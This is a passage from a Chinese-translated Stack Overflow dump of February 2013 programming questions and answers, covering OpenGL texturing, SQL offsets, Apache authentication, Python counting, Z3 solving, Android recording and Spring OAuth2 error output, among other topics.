    glTexImage2D(GL_TEXTURE_2D, 0, 3, 512, 512, 0, GL_RGB, GL_UNSIGNED_BYTE,earth);

    glDisable(GL_TEXTURE_2D);
}

void Draw()
{

    glEnable(GL_TEXTURE_2D);
    // Here you specify WHICH texture you will bind to your coordinates.
    glBindTexture(GL_TEXTURE_2D,1);
    glColor3f(1,1,1);

    double n=6;
    glBegin(GL_QUADS);
    glTexCoord2d(0,50);     glVertex2f(n/2, n/2);
    glTexCoord2d(50,0);     glVertex2f(n/2, -n/2);
    glTexCoord2d(50,50);    glVertex2f(-n/2, -n/2);
    glTexCoord2d(0,50);     glVertex2f(-n/2, n/2);
    glEnd();
    // Do not forget this line, as then the rest of the colors in your
    // Program will get messed up!!!
    glDisable(GL_TEXTURE_2D);
} 
```

我得到的只是： ![在此处输入图像描述](../Images/8468da31b90d26cff0768da9314c9363.png)

我能知道为什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T11:16:56.830

基本上，不，您不能只为 GL 提供任意纹理格式 - 它只需要像素数据，而不是编码文件。

您发布的代码清楚地声明了一个用于 24 位 RGB 数据的数组，但随后您打开并尝试从 GIF 文件中读取那么多数据。GIF 是一种压缩和调色的格式，包含标题信息等，所以这永远行不通。

您需要使用图像加载器将文件解压缩为原始像素。

此外，您的纹理坐标看起来不正确。有四个顶点，但只使用了 3 个不同的坐标，并且 2 个相邻的坐标彼此对角相对。即使您的纹理加载正确，这也不太可能是您想要的。

# php - 如何将查询结果进一步“移动”一行

> ID：15110679
> 
> 赞同：1
> 
> 时间：2013-02-27T11:14:40.200
> 
> 标签：php, mysql, pdo

假设我有这样的事情：

```
$sql = $con->query("SELECT * FROM Content ORDER BY Time DESC LIMIT 2");
while ($row = $sql->fetch()) {
    echo $row['title'];
} 
```

所以这会抓取表中的 2 个最新条目，然后回显指定的列。如何从我的表中获取第二个和第三个最近的条目而忽略第一个？

现在我正在考虑将限制设置为 3 并以某种方式跳过第一个结果并抓住剩下的 2 个。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:15:26.100

试试这个 ：

`LIMIT 1,2`

1 => 偏移量：从哪里开始（第一个将是 0）
2 => 记录数

```
$sql = $con->query("SELECT * FROM Content ORDER BY Time DESC LIMIT 1,2");
while ($row = $sql->fetch()) {
    echo $row['title'];
} 
```

# apache - 具有 apache 身份验证的目录，但一个文件对所有人开放

> ID：15110682
> 
> 赞同：0
> 
> 时间：2013-02-27T11:14:49.827
> 
> 标签：apache

我想用 apache 身份验证保护目录，但只有一个文件，所以我做了：

<目录 /path/to/dir>

```
 AuthType Basic

 AuthName "Private  Pages"
 AuthBasicProvider file
 AuthUserFile /path/to/.htpasswd
 require user userid

 <FilesMatch "^exception.html$">
    Order Allow,Deny
    allow from All
 </FilesMatch> 
```

</目录>

但它并非所有文件都要求输入密码。我还尝试在文件名中的点之前使用 \ 并使用：

```
<File exception.html> 
```

没有什么可以帮助它要求所有文件的密码，包括 exception.html

我做错了什么？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-31T12:48:15.597

您应该在 serverfault 上查看类似的问题：

[如何在其他禁止的 Apache 目录中对单个文件使用基本身份验证？](https://serverfault.com/questions/151240/how-to-use-basic-auth-for-single-file-in-otherwise-forbidden-apache-directory "如何在其他禁止的 Apache 目录中对单个文件使用基本身份验证？")

# python - 计算同步列表中项目的组合（作为字典中的元组）

> ID：15110685
> 
> 赞同：0
> 
> 时间：2013-02-27T11:14:57.517
> 
> 标签：python

我有两个清单：

```
l1 = ['k', 'l', 'k', 's', 'l', 't', 'k']
l2 = ['h', 't', 'h', 't', 't', 's', 's'] 
```

我想计算第一个列表中第 i 个位置与第二个列表中相同位置的项目组合的出现次数。我希望结果是：

kh = 2，lt = 2，st = 1，ts = 1，ks = 1

我认为最好先从列表中创建一个元组：

```
tupleList = zip(l1,l2)
tupeleList = [('k', 'h'), ('l', 't'), ('k', 'h'), ('s', 't'), ('l', 't'), ('t', 's'), ('k', 's')] 
```

然后制作一个字典来计算该元组列表中的唯一元素：

```
myDict = {}
for item in tupleList:
    if item[1] in myDict:
        myDi [ item[1] ] += item[2]
    else
        myDi [ item[1] ] = item[2] 
```

但我收到此错误：“元组索引超出范围”。问题是什么？首先制作一个元组可能效率不高吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-27T11:16:38.243

您可以使用[collections.Counter](http://docs.python.org/2/library/collections.html#collections.Counter)：

```
In [7]: import collections
In [10]: count = collections.Counter(zip(l1,l2))

In [11]: count
Out[11]: Counter({('l', 't'): 2, ('k', 'h'): 2, ('s', 't'): 1, ('t', 's'): 1, ('k', 's'): 1}) 
```

`collection.Counter`是 的子类`dict`。因此，您通常`dict`可以像[使用](http://docs.python.org/2/library/collections.html#collections.Counter.elements).`elements``most_common``subtract`

* * *

如果您想修复发布的代码（只需进行最少的更改），它看起来像：

```
l1 = ['k', 'l', 'k', 's', 'l', 't', 'k']
l2 = ['h', 't', 'h', 't', 't', 's', 's']
tupleList = zip(l1,l2)
myDict = {}
for item in tupleList:
    if item in myDict:
        myDict[ item ] += 1
    else:
        myDict[ item ] = 1
print(myDict) 
```

* * *

但是，`dict`s 有一个[get](http://docs.python.org/2/library/stdtypes.html#dict.get)方法，可用于进一步简化您的代码：

```
for item in tupleList:
    myDict[item] = myDict.get(item, 0) + 1 
```

* * *

或者，正如@JonClements 在评论中指出的那样，您可以使用 [collections.defaultdict](http://docs.python.org/2/library/collections.html#collections.defaultdict)：

```
myDict = collections.defaultdict(int)
for item in tupleList:
    myDict[item] += 1 
```

# logic - Z3 定理证明器：勾股定理（非线性算术）

> ID：15110692
> 
> 赞同：4
> 
> 时间：2013-02-27T11:15:10.250
> 
> 标签：logic, z3, smt, constraint-programming, theorem-proving

## 因此？

### 我的问题发生的用例上下文

我定义了一个三角形的 3 个随机项。Microsoft Z3 应输出：

*   约束是否满足或是否有无效的输入值？
*   所有其他三角形项目的模型，其中所有变量都分配给具体值。

为了约束我需要**`assert`**三角形等式的项目 - 我想从勾股定理（`(h_c² + p² = b²) ^ (h_c² + q² = a²)`）开始。

## 问题

我知道 Microsoft Z3 解决非线性算术问题的能力有限。但即使是一些手动计算器也能够解决这样一个非常*简化的版本*：

```
(set-option :print-success true)
(set-option :produce-proofs true)
(declare-const a Real)
(declare-const b Real)
(assert (= a 1.0))
(assert (= b 1.0))
(assert
    (exists
        ((c Real))
        (=
            (+
                (* a a)
                (* b b)
            )
            (* c c)
        )
    )
)
(check-sat)
(get-model) 
```

## 问题

*   如果给出两个值，有没有办法让 Microsoft Z3 解决勾股定理？
*   或者：是否有另一个定理证明器能够处理这些非线性算术的情况？

感谢您对此的帮助 - 如果有任何不清楚的地方，请发表评论。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T14:35:54.210

Z3 有一个用于非线性算术的新求解器 (nlsat)。它比其他求解器更有效（[请参阅本文](http://research.microsoft.com/en-us/um/people/leonardo/files/IJCAR2012.pdf)）。新的求解器对于无量词问题是完整的。但是，新的求解器不支持生成证明。如果我们禁用证明生成，那么 Z3 将使用 nlsat 并轻松解决问题。根据您的问题，您似乎真的在寻找解决方案，因此禁用证明生成似乎不是问题。

此外，Z3 不会产生近似解（如手算器）。它使用实数代数的精确表示。我们还可以要求 Z3 以十进制表示法显示结果（选项`:pp-decimal`）。 [这是您的在线示例](http://rise4fun.com/Z3/DkLv)。

在此示例中，当使用精确表示时，Z3 将显示以下结果`c`。

```
(root-obj (+ (^ x 2) (- 2)) 1) 
```

据说这是`c`多项式的第一个根`x^2 - 2`。当我们使用`(set-option :pp-decimal true)`时，它会显示

```
(- 1.4142135623?) 
```

问号用于表示结果被截断。请注意，结果是否定的。但是，它确实是您发布的问题的解决方案。由于您正在寻找三角形，因此您应该断言常量都 > 0。

顺便说一句，您不需要存在量词。我们可以简单地使用一个常量`c`。这是一个示例（也可以[在rise4fun 在线获得](http://rise4fun.com/Z3/gUO9)）：

```
(set-option :pp-decimal true)
(declare-const a Real)
(declare-const b Real)
(declare-const c Real)
(assert (= a 1.0))
(assert (= b 1.0))
(assert (> c 0))
(assert (= (+ (* a a) (* b b)) (* c c)))
(check-sat)
(get-model) 
```

这是另一个没有解决方案的示例（也可以[在rise4fun 在线获得](http://rise4fun.com/Z3/9sldh)）：

```
(set-option :pp-decimal true)
(declare-const a Real)
(declare-const b Real)
(declare-const c Real)
(assert (> c 0))
(assert (> a c))
(assert (= (+ (* a a) (* b b)) (* c c)))
(check-sat) 
```

顺便说一句，您应该考虑[Z3 的 Python 接口](http://rise4fun.com/Z3Py/tutorial/guide)。它对用户更加友好。我链接的教程在运动学中有示例。他们还使用非线性算术来编码简单的高中物理问题。

# php - 如何将 XML 数据作为关联数组获取，其中属性作为 PHP 中的键

> ID：15110695
> 
> 赞同：1
> 
> 时间：2013-02-27T11:15:16.893
> 
> 标签：php, xml

我需要将以下 XML 转换/解析为关联数组。我尝试使用 PHP 的 simplexml_load_string 函数，但它没有将属性检索为关键元素。

```
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<OPS_envelope>
 <header>
  <version>0.9</version>
 </header>
 <body>
  <data_block>
   <dt_assoc>
    <item key="protocol">XCP</item>
    <item key="object">DOMAIN</item>
    <item key="response_text">Command Successful</item>
    <item key="action">REPLY</item>
    <item key="attributes">
     <dt_assoc>
      <item key="price">10.00</item>
     </dt_assoc>
    </item>
    <item key="response_code">200</item>
    <item key="is_success">1</item>
   </dt_assoc>
  </data_block>
 </body>
</OPS_envelope> 
```

我需要像这样的上述 XML 数据，键 => 值对。

```
array('protocol' => 'XCP',
    'object' => 'DOMAIN', 
    'response_text' => 'Command Successful',
    'action' => 'REPLY', 
    'attributes' => array(
      'price' => '10.00'
    ),
    'response_code' => '200',
    'is_success' => 1
) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:23:33.413

你可以使用`DOMDocument`and`XPath`做你想做的事：

```
$data = //insert here your xml
$DOMdocument = new DOMDocument();
$DOMdocument->loadXML($data);
$xpath = new DOMXPath($DOMdocument);
$itemElements = $xpath->query('//item'); //obtain all items tag in the DOM
$argsArray = array();
foreach($itemElements as $itemTag)
{
    $key = $itemTag->getAttribute('key'); //obtain the key
    $value = $itemTag->nodeValue; //obtain value
    $argsArray[$key] = $value;
} 
```

您可以找到更多信息，单击[DOMDocument](http://php.net/manual/en/class.domdocument.php)或[XPath](http://php.net/manual/en/class.domxpath.php)

# 编辑

我看到你有一个有叶子的节点。

```
<item key="attributes">
    <dt_assoc>
        <item key="price">10.00</item>
    </dt_assoc>
</item> 
```

显然，在这种情况下，您必须再次“导航”这个“子 DOM”才能获得您要查找的内容。

[Prasanth](https://stackoverflow.com/users/1948260/prasanth-bendra)的回答也不错，但是会产生等作为key，不知道是不是你想要的。

# objective-c - 如何不以模态方式打开 NSOpenPanel（因为我要打开现有工作表）

> ID：15110697
> 
> 赞同：2
> 
> 时间：2013-02-27T11:15:24.900
> 
> 标签：objective-c, macos, cocoa

我有一个 NSPanel，我需要将文件路径加载到它的一个字段中。

我目前正在使用：

```
NSOpenPanel *browsePanel = [[NSOpenPanel alloc] init];
[browsePanel setCanChooseFiles:YES];
[browsePanel setCanChooseDirectories:NO];
[browsePanel setCanCreateDirectories:NO];
[browsePanel beginSheetForDirectory:nil
                               file:nil
                              types:nil
                     modalForWindow:[self window]
                      modalDelegate:self
                     didEndSelector:@selector(browsePanelPanelDidEnd:returnCode:contextInfo:)
                        contextInfo:[NSNumber numberWithInteger:[sender tag]]
 ]; 
```

但是 NSOpenPanel 工作表没有出现，并且我在控制台中没有收到任何错误消息。我想这是因为我是从现有的工作表中打开它，而且我每次不能加载超过 1 个工作表。

所以我现在使用 [browsePanel makeKeyAndOrderFront:[self window]]; 但我遇到了两个问题：

1.  面板总是在我的模态表的背面，我不能在上面显示它。此外，我无法移动保留在原始工作表上的焦点。

2.  如果我不以模态方式加载它，如何分配结束选择器来处理数据？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:50:27.480

*每个窗口*一张。更多的工作表意味着更多的窗口和奇怪的 UI。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:21:09.190

您正在使用 ：

```
- (void)beginSheetForDirectory:(NSString *)path file:(NSString *)name types:(NSArray *)fileTypes modalForWindow:(NSWindow *)docWindow modalDelegate:(id)delegate didEndSelector:(SEL)didEndSelector contextInfo:(void *)contextInfo NS_DEPRECATED_MAC(10_0, 10_6); 
```

已弃用。你应该使用

```
[browsePanel beginSheetModalForWindow:self.window completionHandler:nil]; 
```

编辑：

[检查这个正在运行的项目](http://www.keepandshare.com/doc/5873936/browsermodalnsopenpanel-34k?da=y)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T19:31:26.293

从[展示一系列表格](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Sheets/Tasks/UsingCascadingSheets.html)：

> Cocoa 不支持级联或嵌套表的概念。根据*Apple 人机界面指南*，“当用户响应一个工作表，并且该文档的另一个工作表打开时，第一个工作表必须在第二个工作表打开之前关闭。”</p>

该文档继续告诉您如何呈现*一系列*工作表，当第二个打开时，它会关闭第一个，等等。

您要么需要采用这样的系列，要么更改您的设计，以便您的第一张工作表，即调用 NSOpenPanel 的工作表，根本就不是工作表。

**仅供参考：**在沙盒世界`NSOpenPanel`中是一个非常不同的野兽，同时保持基本相同的 UI。其中的变化是`NSOpenPanel`不再是`NSWindow`...的子类。您现在可能玩的技巧可能会`NSOpenPanel`在沙盒下崩溃和燃烧，小心行事。

# mysql - SQL 更新返回零行

> ID：15110700
> 
> 赞同：0
> 
> 时间：2013-02-27T11:15:31.370
> 
> 标签：mysql, sql

```
UPDATE starfsfolk
SET starfsfolk.stada=2
WHERE starfsfolk.deild LIKE '%Hugbúnaðardeild%';

UPDATE starfsfolk
SET starfsfolk.stada=3
WHERE starfsfolk.deild LIKE '%Markaðsdeild%' 
```

正是我正在使用的代码。

我尝试了各种不同的版本（比如 = "Markaðsdeild" 或 LIKE "Markaðsdeild"）

如果我使用选择，其中大部分工作，但我需要使用更新并且由于某种原因它不起作用。

此 WHERE 命令适用于选择，但如果我使用更新命令，它将返回零行。我究竟做错了什么？

编辑：为了澄清，在更新命令之前和之后的所有情况下，stada 都设置为 1。它并没有像我想要的那样从 1 变为 2 和 3。

Edit2：这是数据库[的截图](http://i.imgur.com/CJcedal.png)，我也可以给你创建命令。

Edit3：Stada 有点，不是 int，我发现了，不知道会发生什么变化。

解决方案：解决了我自己，因为位只是 1 和 0，错误出现在表的创建中，所以我用 stada 作为 int 重新制作了它，现在代码正在运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:13:49.290

服务器和客户端的字符集是不同的。

[http://dev.mysql.com/doc/refman/5.5/en/charset-connection.html](http://dev.mysql.com/doc/refman/5.5/en/charset-connection.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:17:04.677

如果查询未更改 stada 的值，则将返回零行，因为没有更新任何内容。

# database - 使用不同帐户进行用户登录的数据库方案

> ID：15110701
> 
> 赞同：0
> 
> 时间：2013-02-27T11:15:31.597
> 
> 标签：database, facebook, authentication, logging, openid

目前我需要为不同的社交帐户（facebook、google、twitter 等）提供网站日志记录。

我知道 stackoverflow 有相同的系统，我想知道公共访问中是否有 stackoverflow 数据库模型。所以我可以找到在我的数据库中存储用户数据的正确方法。

目前我有下一个问题。

所以，我有我的用户表：

*   用户身份
*   用户名
*   注册日期
*   电子邮件
*   评分

对于使用网站表单创建帐户的用户，我使用下一个附加信息：

*   密码
*   名
*   姓
*   阿凡达

我对如何为使用社交网络登录的用户存储数据以及我应该存储什么存有疑问。看来我不需要存储 facebook 名称、姓氏等。我考虑在需要的页面上使用 js 获取它。

此外，我正在考虑如何为用户提供为他的个人资料添加 facebook、twitter 参考等。

PS 我正在使用 DotNetOpenAuth 通过社交网络进行用户身份验证。使用 asp.net MVC 3\. 关于我网站上的功能：只是为用户添加文章和评分。对于评论，我使用[https://disqus.com/](https://disqus.com/)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T13:23:08.757

理想情况下，您应该有两张桌子。一个用于用户，一个用于身份。在 Users 表中，您存储应用程序用户 ID、姓名、电子邮件等内容。在 Identities 表中，您链接回 User 表中的人员，但有一个“network”字段，说明 Identities 行是哪个网络适用于（例如 Facebook、Google、Twitter 等）。

Identities 表可以存储特定于该平台的用户 ID 和详细信息，例如 Facebook 的 User_ID、Twitter 用户名等。用户在 Users 表中将有一个条目，但在 Identities 表中可以有多个条目，具体取决于有多少个用户已连接的网络。

# android - MediaRecorder 视频录制：嘈杂的图像

> ID：15110702
> 
> 赞同：1
> 
> 时间：2013-02-27T11:15:31.780
> 
> 标签：android, android-mediarecorder

我发送此消息是因为我在使用 Android 平板电脑（Android 2.3.3 上的 iMX53）录制视频时遇到问题。

首先，结果如下：

![在此处输入图像描述](../Images/728f7eb85caaff667ec33b0e3428bbdb.png)

注意：绿色部分和蓝色部分取决于我录制的内容。

这是我正在使用的代码：

```
 public boolean startRecording(){

    try {
        camera.unlock();
        mediaRecorder = new MediaRecorder();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        mediaRecorder.setVideoSize(320,240);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.DEFAULT);
        mediaRecorder.setMaxDuration(10000);

        String uniqueOutFile =  Environment.getExternalStorageDirectory().getPath()+ "/test.3gp";
        File outFile = new File(uniqueOutFile);
        if (outFile.exists()) {
            outFile.delete();
        }
        mediaRecorder.setOutputFile(uniqueOutFile);
        mediaRecorder.prepare();
        mediaRecorder.start();
        started = true;
    }
    catch (IllegalStateException e) {
        Log.e(TAG, e.getMessage());
        e.printStackTrace();
        camera.lock();
        return false;
    } catch (IOException e) {
        Log.e(TAG, e.getMessage());
        e.printStackTrace();
        camera.lock();
    return false;
    }
    return true;
    } 
```

有没有人知道什么可以创造这个？你知道另一种方法吗？建议...？

提前谢谢你。

问候，

# javascript - Extjs Grid面板一列背景颜色改变另一列值

> ID：15110710
> 
> 赞同：1
> 
> 时间：2013-02-27T11:16:08.547
> 
> 标签：javascript, extjs, extjs3

我有一个 Extjs 编辑器网格面板，在该面板中我必须根据另一列值的值更改一列的 css，然后怎么做我不能使用渲染器函数，因为它在 onload 上工作是否有任何其他方式我正在附加代码在其中我有性别列和 id 列，所以当性别列选择男性时，ID 的背景颜色应该更改为粉红色，否则怎么做。

```
 {
            id: 'value',
            name: 'value',
            header: 'Gender',
            dataIndex: 'insured',
            width: 100,
            editor: new fm.ComboBox({

                typeAhead: true,
                displayField: 'gender',
                mode: 'local',
                transform: 'gender',
                triggerAction: 'all',
                selectOnFocus: true,
                forceSelection: true,
                stripeRows: true,
                lazyRender: true,
                listeners: {

                    }
                }
            })
        },
  {
        id: 'ID',
        name: 'ID',
        header: 'ID',
        dataIndex: 'ID',
        width: 100,
        hidden: true,
        editor: new fm.TextField({
            allowBlank: true,
            maxLength: 500
        })
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:15:41.250

这将适用于简单的渲染

**CSS：**

```
.custom-column
{
    background-color: #ccc; 
} 
```

**JavaScript：**

```
columns: [{
    dataIndex: 'name',
    renderer: function (value, meta) {
        meta.css = 'custom-column';
        return value;
    }
}] 
```

## 编辑：

您可以使用[`getRowClass`](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.view.Table-method-getRowClass)在呈现期间将自定义 CSS 类应用于行。

> 覆盖此函数以在呈现期间将自定义 CSS 类应用于行。此函数应返回将添加到行的包装 div 的 CSS 类名称（或空字符串 '' 表示无）。要应用多个类名，只需在字符串中返回以空格分隔的它们（例如，'my-class another-class'）。

**Javascript：**

```
columns: [{
    dataIndex: 'ID',
    ...
    tdCls: 'ID' //add table css class
}],

viewConfig: {
    getRowClass: function(record, index) {
        var gender = record.get('insured');

        if (gender === 0) {
        //male
            return 'gender-male';
        } else if (gender === 1) {
        //female
            return 'gender-female';
        } else {
        //unknown
            return 'gender-unknown';
        }
    }
} 
```

附加**CSS：**

```
.gender-male .ID {
    background-color: #088da5;
}
.gender-female .ID {
    background-color: #f799af;
}
.gender-unknown .ID {
    background-color: #BADA55;
} 
```

# entity-framework - entityframework 单表继承类不能使用时间戳？

> ID：15110715
> 
> 赞同：2
> 
> 时间：2013-02-27T11:16:15.607
> 
> 标签：entity-framework, timestamp

我想在 Inherited 类中创建一个 TimeStamp 字段，如下所示：

```
[Table("TABLE_A")]
public class A
{
  public int ID {get;set;}

  public string Name {get;set;}
}

[Table("TABLE_B")]
public class B : A
{
  public string Address {get;set;}

  [TimeStamp]
  public byte[] RowVersion {get;set;}
} 
```

但失败了，我该怎么办？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:45:04.827

你会看到错误

> 类型“B”定义了不允许用于基本 EntitySet 类型的子类型的新并发要求。

这正是错误所说的意思。实体框架不支持派生类型中的并发检查。如果您添加简单的并发检查而不是时间戳，您将看到相同的错误：

```
[Table("TABLE_B")]
public class B : A
{
    [ConcurrencyCheck]
    public string Address { get; set; }
} 
```

如果您将并发检查移至基类，那么它将起作用，但仅适用于基类。如果您需要对派生类型执行检查，我认为您应该使用存储过程来更新实体。

# java - 删除特定括号之间的所有内容

> ID：15110716
> 
> 赞同：2
> 
> 时间：2013-02-27T11:16:19.747
> 
> 标签：java, regex

我有一个这样的特定段落：

> 你好。这太 [abc="12"]awesome[/abc] 以至于每次我在堆栈中发布 [abc="456"] 问题[/abc] 时，它都会在接下来的 5 [abc="53" ]分钟[/abc]。

我想使用正则表达式删除`abc`（包括）之间的所有标签`[]`。我不想删除两者之间的任何内容，`[]`因为这也会删除`[answered]`哪个不是`abc`标签。

基本上，在它还包含 text之间`[`和之间删除所有内容。`]``abc`

我已经能够到达

```
<%=movieProduct.getSynopsis().replaceAll("[.*] *", "") %> 
```

但它不起作用，而且我不知道如何搜索 abc。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:20:18.387

这应该可以选择所有必需的标签：

```
\[/?abc.*?\] 
```

# 演示：

[http://regexr.com?33u9u](http://regexr.com?33u9u)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:19:47.097

你可以试试

```
replaceAll("\\[abc.*?\\].*?\\[\\/abc\\]", "") 
```

擦除标签之间的所有内容。`\`使用正则表达式时不要忘记使用特殊字符转义。

如果要将文本保留在标签内，可以使用

```
replaceAll("\\[abc.*?\\](.*?)\\[\\/abc\\]", "$1") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:18:57.427

尝试以下正则表达式：

```
"[[].*abc.*?[]]" 
```

或者

```
movieProduct.getSynopsis().replaceAll("[[]abc.+?[]](.+?)[[]/abc[]]", "$1"); 
```

# ruby-on-rails - papertrail，设置管理员用户

> ID：15110723
> 
> 赞同：2
> 
> 时间：2013-02-27T11:16:42.267
> 
> 标签：ruby-on-rails, state-machine, paper-trail-gem

我在模型上使用 state_machine 和 papertrail gem（rails 3.2）

我想跟踪所有状态变化以及是谁发起的，papertrail 就像一个魅力。

现在我遇到了一种情况，系统通过 rake take 来改变对象的状态。

我如何告诉系统谁是来自 rake 任务的 current_user（我正在使用设计）？

我想将该用户设置为管理员用户，以便 papertrail 可以存储 whodunnit。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:24:43.633

哦，男孩，我在这里找到了答案

[https://github.com/airblade/paper_trail#finding-out-who-was-responsible-for-a-change](https://github.com/airblade/paper_trail#finding-out-who-was-responsible-for-a-change)

# android - 如何从 android listview 获取检查项目？

> ID：15110724
> 
> 赞同：3
> 
> 时间：2013-02-27T11:16:45.800
> 
> 标签：android, listview, checkbox

我有一个使用 listview 的 android 应用程序。每行由 ImageView、一个 TextView 和一个 CheckBox 组成。我想从此列表视图中获取选定的项目。我用过

```
private void getSelectedItems() {
        List<String>list = new ArrayList<String>();
        try {
            SparseBooleanArray checkedItems = new SparseBooleanArray();
            checkedItems = listView.getCheckedItemPositions();
            if (checkedItems == null) {
                return;
            }
            final int checkedItemsCount = checkedItems.size();
            for (int i = 0; i < checkedItemsCount; ++i) {
                int position = checkedItems.keyAt(i);
                boolean bool = checkedItems.valueAt(position);
                if (bool) {
                   list.add(mainList.get(position));
                }
            }

        } catch (Exception e) {

        }
    } 
```

但是我想在启动时将某些项目设置为针对某个条件进行检查。仅当用户选中/取消选中某个项目时才会获得选中的项目。即使在启动时以编程方式将项目设置为选中，也不会获得选中的项目。这里有什么问题？

提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:37:29.893

Do something like this,

```
ArrayList<Integer> checkedPositions = new ArrayList<Integer>();
myListView.setOnItemClickListener(new OnItemClickListener() {

            @Override
            public void onItemClick(AdapterView<?> arg0, View view,
                    int position, long arg3) {
                CheckBox cb = (CheckBox) view.findViewById(R.id.yourCheckBox);
                Toast.makeText(getApplicationContext(), "Row " + position + " is checked", Toast.LENGTH_SHORT).show();
                if (cb.isChecked()) {
                    checkedPositions.add(position); // add position of the row
                                                    // when checkbox is checked
                } else {
                    checkedPositions.remove(position); // remove the position when the
                                            // checkbox is unchecked
                    Toast.makeText(getApplicationContext(), "Row " + position + " is unchecked", Toast.LENGTH_SHORT).show();
                }
            }
        }); 
```

# javascript - 在 ExtJS 中制作自定义垂直滚动条

> ID：15110728
> 
> 赞同：0
> 
> 时间：2013-02-27T11:16:56.810
> 
> 标签：javascript, extjs, extjs4

我想制作一个可以在网格上工作的自定义垂直滚动条组件（或插件）。哪个 Ext 组件最适合扩展？ExtJs 库中是否已有可以扩展的滚动条组件或插件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T21:39:25.170

我发现使用带有垂直方向的 Ext.slider 和一些按钮的面板是可以的解决方案。

# css - 查找向菜单项添加边框或填充的 CSS 选择器

> ID：15110729
> 
> 赞同：0
> 
> 时间：2013-02-27T11:17:00.800
> 
> 标签：css, border, less, joomla3.0

我正在使用 Gantry 4.1.7 框架在 Joomla 3.0.3 站点上工作，并且遇到 CSS 问题，即在第一级菜单项上添加边框或一些填充/边距。

从下图中可以看出，顶级菜单项“Références”的左侧有 1px 的偏移量。

![在此处输入图像描述](../Images/7297210c4286652b38b2025182ebdf1c.png)

我试图找到导致该问题的选择器，但我无法识别它。

该网站在密码保护后在线。我创建了一个用户名和密码对，让这里的人访问该站点寻求帮助。我会发布代码，但是由于有很多不同的文件并且我没有造成这种情况的原因，我希望有人能给我一些建议。

该站点可在以下位置访问：[Betelec Dev Site](http://dev.betelec.ch)

**用户名**：stackoverflow
**密码**：assist

我很乐意为某人（通过电子邮件或私人聊天）提供超级管理员访问权限或 ftp 访问权限（不幸的是，客户端的开发机器上没有 ssh）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:21:40.260

```
menu li:hover > .dropdown, .gf-menu li.active:hover > .dropdown { 
left: -1px;
opacity: 1;
top: auto;
} 
```

也许是这样：左：-1px；？？？

# java - 自定义 SpringSecurity OAuth 2 错误输出（未经授权）

> ID：15110734
> 
> 赞同：15
> 
> 时间：2013-02-27T11:17:08.593
> 
> 标签：java, spring-security, oauth-2.0

我们使用 Spring Security OAuth2 保护我们的 REST 服务（用于服务器到服务器的通信，不涉及用户）。但是，当尝试在浏览器中访问受保护的资源时，它会显示：

```
<oauth>
    <error_description>
        An Authentication object was not found in the SecurityContext
    </error_description>
    <error>unauthorized</error>
</oauth> 
```

我们希望这是我们自己选择的自定义页面。有办法吗？

设置 access-denied-page 是不行的。一方面，它需要定义一个我们没有的登录页面，因为这是一个纯服务器到服务器的通信。另一方面，这个属性据说自 Spring 3.0.. 或其他东西以来已被弃用。

无论如何.. 调试我进入 OAuth 错误处理的方式。并发现响应似乎以某种方式丰富了我在错误页面上看到的信息。显然根本没有完成页面渲染，所以看起来没有要替换的错误页面..？！

至少我们想隐藏我们使用 OAuth 的事实，如果我们不能有一个“真实”页面，则只显示一个基本的“拒绝”文本。所以也许我必须扩展 spring 安全处理程序或添加一个自定义过滤器修改响应？！

也许重定向到我们的错误页面？

谢谢！

**编辑**

对于我们当前的设置，请[在此处查看我的其他 SO 问题](https://stackoverflow.com/questions/14138556/spring-security-context-setup-for-2-legged-client-credentials-oauth2-server)

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-08T15:08:15.877

I had to remove the oauth detail too and my solution was to implement my own OAuth2ExceptionRenderer

```
package org.some.nice.code;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpInputMessage;
import org.springframework.http.HttpOutputMessage;
import org.springframework.http.ResponseEntity;
import org.springframework.http.server.ServerHttpResponse;
import org.springframework.http.server.ServletServerHttpRequest;
import org.springframework.http.server.ServletServerHttpResponse;
import org.springframework.security.oauth2.provider.error.OAuth2ExceptionRenderer;
import org.springframework.web.context.request.NativeWebRequest;
import org.springframework.web.context.request.ServletWebRequest;

public class HeaderOnlyOAuth2ExceptionRenderer implements OAuth2ExceptionRenderer
{
    private final Log logger = LogFactory
            .getLog(MyOAuth2ExceptionRenderer.class);

